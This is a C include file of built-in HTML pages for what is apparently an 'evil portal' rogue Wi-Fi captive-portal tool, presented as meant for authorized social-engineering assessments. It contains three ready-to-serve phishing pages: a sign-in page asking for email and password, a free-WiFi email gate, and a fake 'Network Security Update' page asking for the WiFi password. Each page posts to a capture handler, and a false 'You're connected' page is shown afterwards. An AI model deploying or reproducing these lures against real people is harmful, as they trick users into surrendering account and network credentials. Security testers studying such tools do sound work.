/* portal_templates.inc — built-in captive-portal pages for evil_portal.c
 *
 * These are GENERIC captive-portal archetypes used in authorized
 * social-engineering assessments. They do NOT impersonate any real company,
 * product, or brand. If an engagement needs a specific look, load custom HTML
 * (later phase) instead of editing these into brand clones.
 *
 * HTML uses single-quoted attributes so the C string literals need no
 * backslash escaping. All forms POST url-encoded fields to /login; the
 * capture handler looks for user keys (email|username|user|login|identifier)
 * and secret keys (password|pass|pwd|key|psk). No external assets are
 * referenced (the portal has no upstream internet).
 */

/* Shared minimal stylesheet, inlined into each page. */
#define PORTAL_CSS \
    "<style>body{margin:0;font-family:-apple-system,Segoe UI,Roboto,Arial," \
    "sans-serif;background:#eef1f5;color:#1c2430}" \
    ".wrap{min-height:100vh;display:flex;align-items:center;justify-content:" \
    "center;padding:20px}.card{background:#fff;max-width:360px;width:100%;" \
    "box-sizing:border-box;border-radius:14px;box-shadow:0 6px 30px " \
    "rgba(0,0,0,.12);padding:28px}h1{font-size:20px;margin:0 0 4px}" \
    "p{color:#6b7682;font-size:13px;margin:0 0 18px;line-height:1.4}" \
    "label{display:block;font-size:12px;color:#6b7682;margin:14px 0 6px}" \
    "input{width:100%;box-sizing:border-box;padding:12px;border:1px solid " \
    "#d7dde5;border-radius:8px;font-size:15px}button{width:100%;margin-top:" \
    "22px;padding:13px;border:0;border-radius:8px;background:#2563eb;color:" \
    "#fff;font-size:15px;font-weight:600}.n{font-size:11px;color:#9aa5b1;" \
    "text-align:center;margin-top:16px}</style>"

#define PORTAL_HEAD \
    "<!DOCTYPE html><html><head><meta charset='utf-8'>" \
    "<meta name='viewport' content='width=device-width,initial-scale=1'>" \
    "<title>WiFi</title>" PORTAL_CSS "</head>"

/* 1) Neutral "sign in to get online" login. */
static const char TMPL_LOGIN_HTML[] =
    PORTAL_HEAD
    "<body><div class='wrap'><form class='card' method='POST' action='/login'>"
    "<h1>Connect to the Internet</h1>"
    "<p>Please sign in with your account to continue browsing.</p>"
    "<label>Email or username</label>"
    "<input name='email' type='text' autocomplete='username' required>"
    "<label>Password</label>"
    "<input name='password' type='password' autocomplete='current-password' required>"
    "<button type='submit'>Sign in</button>"
    "<div class='n'>By connecting you agree to the acceptable-use policy.</div>"
    "</form></div></body></html>";

/* 2) "Free WiFi" email gate. */
static const char TMPL_TERMS_HTML[] =
    PORTAL_HEAD
    "<body><div class='wrap'><form class='card' method='POST' action='/login'>"
    "<h1>Free WiFi</h1>"
    "<p>Enter your email address to accept the terms and get connected.</p>"
    "<label>Email address</label>"
    "<input name='email' type='email' required>"
    "<label>Password (optional)</label>"
    "<input name='password' type='password'>"
    "<button type='submit'>Connect</button>"
    "<div class='n'>Standard terms of service apply.</div>"
    "</form></div></body></html>";

/* 3) Generic "re-enter WiFi password" network-maintenance prompt. */
static const char TMPL_UPDATE_HTML[] =
    PORTAL_HEAD
    "<body><div class='wrap'><form class='card' method='POST' action='/login'>"
    "<h1>Network Security Update</h1>"
    "<p>A security update is available. Re-enter the WiFi password to keep "
    "this device connected to the network.</p>"
    "<label>WiFi password</label>"
    "<input name='password' type='password' required>"
    "<button type='submit'>Update &amp; reconnect</button>"
    "<div class='n'>This will apply the latest network settings.</div>"
    "</form></div></body></html>";

/* Shown after a submission (the portal has no upstream internet to hand off
 * to, so just acknowledge). */
static const char TMPL_DONE_HTML[] =
    PORTAL_HEAD
    "<body><div class='wrap'><div class='card'>"
    "<h1>You're connected</h1>"
    "<p>Thanks — your device is now being connected to the network. You can "
    "close this page.</p></div></div></body></html>";

typedef struct {
    const char *id;           /* CLI id / app key                     */
    const char *label;        /* human label for the app              */
    const char *default_ssid; /* AP name when the operator gives none */
    const char *html;         /* page body served on GET /            */
} portal_template_t;

static const portal_template_t PORTAL_TEMPLATES[] = {
    { "login",  "Network Login",  "Internet WiFi", TMPL_LOGIN_HTML  },
    { "terms",  "Free WiFi Gate", "Free WiFi",     TMPL_TERMS_HTML  },
    { "update", "Network Update", "WiFi-Setup",    TMPL_UPDATE_HTML },
};
#define PORTAL_TEMPLATE_COUNT \
    (sizeof(PORTAL_TEMPLATES) / sizeof(PORTAL_TEMPLATES[0]))
